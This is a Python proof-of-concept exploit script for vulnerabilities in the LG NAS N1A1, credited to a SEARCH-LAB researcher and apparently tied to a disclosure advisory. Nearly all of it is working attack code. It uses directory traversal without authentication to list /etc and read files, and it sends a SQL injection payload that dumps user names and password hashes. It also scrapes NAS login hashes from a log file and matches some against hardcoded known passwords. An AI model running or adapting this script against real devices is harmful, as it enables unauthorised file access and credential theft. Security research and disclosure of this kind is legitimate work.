#
# POC code for LG NAS N1A1 vulnerabilities
#  1: Insufficient function level access control (getFile, getFiles)
#  2: Directory traversal (getFile, getFiles)
#  3: SQL Injection (getFamilycastUsers)
#  4: Sensitive information in log files (getNASPwdHases)
#
# Credit: Gergely Eberhardt (@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)
#
# Advisory: http://search-lab.hu/...
# LG support page: http://www.lg.com/us/support-product/lg-N1A1DD1

import sys
import requests
import xml.etree.ElementTree as ET
import re

familyhash = {'39813a5f67876a3dae5216b0c78d7f8c':'familycast'}
nashash = {'8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918':'admin'}

class nas:
    def __init__(self, addr, port):
        self.addr = addr
        self.port = port

    def getUri(self, uri):
        return 'http://%s:%d/familycast/interface/php/%s'%(self.addr,self.port,uri)

    def checkFamilycast(self):
        r = requests.get('http://%s:%d/familycast/'%(self.addr,self.port))
        if (r.text.encode('utf-8').find('folderList.html') > 0):
            return True
        return False

    # retrieves file content at the specified folder and file name using
    # directory traversal and insufficient authentication
    # getFile can read only files accessible by apache
    def getFile(self, path, fname):
        s = requests.Session()
        s.get(self.getUri('file.php'))
        payload = {'mode':'download', 'src_dir':'../../../..'+path, 'file_name':fname}
        r = s.post(self.getUri('file.php'), data=payload)
        return r.content

    # retrieves file names at the specified folder using directory traversal and
    # insufficient authentication
    def getFiles(self, path):
        s = requests.Session()
        s.get(self.getUri('get_list.php'))
        payload = {'mode':'Filelist', 'path':'../../../..'+path}
        r = s.post(self.getUri('get_list.php'), data=payload)
        files = r.text.split(':')
        return files

    # reads out familycast user names and password hashes using SQL injection
    def getFamilycastUsers(self):
        s = requests.Session()
        s.get(self.getUri('profile.php'))
        payload = {'proc_type':'family_get', 'id':'-1 union select name,password,3 from user'}
        r = s.post(self.getUri('profile.php'), data=payload)
        print 'name:hash (pwd)'
        root = ET.fromstring(r.text.encode('utf-8'))
        for aitem in root.findall('item'):
            name = aitem.find('target_id').text
            hash = aitem.find('relationship_type').text
            if (hash in familyhash):
                print '  %s:%s (%s)'%(name, hash, familyhash[hash])
            else:
                print '  %s:%s'%(name, hash)

    # parses the ui log for password hashes
    # prints out invalid login requests also
    def getNASPwdHases(self):
        # get the log file
        res = n.getFile('/var/tmp', 'ui_script.log')
        print 'name:hash (pwd)'
        found = {}
        lines = res.split('\x0a')
        for l in lines:
            m = re.search("'login.doLogin', u'userPassword': '([a-z0-9]+)', u'userId': '(.+)'}", l)
            if (m != None):
                hash = m.group(1)
                id = m.group(2)
                fs = '%s_%s'%(id,hash)
                if (not fs in found):
                    found[fs] = 1
                    if (hash in nashash):
                        print '  %s:%s (%s)'%(id, hash, nashash[hash])
                    else:
                        print '  %s:%s'%(id, hash)

#------------------------------------

if (len(sys.argv) < 2):
    print 'lg_nas_pc.py addr [port]'
addr = sys.argv[1]
port = 8000
if (len(sys.argv) == 3):
    port = int(sys.argv[2])

# create nas object
n = nas(addr, port)
if (n.checkFamilycast()):
    # get file list of /etc
    res = n.getFiles('/etc')
    print '/etc file list:'
    for f in res:
        print '  %s'%(f.encode('utf-8'))

    # get familycast users
    print '\nFamilycast users:'
    n.getFamilycastUsers()

    # get nas users
    print '\nNAS users:'
    n.getNASPwdHases()

else:
    print 'Familycast service was not found'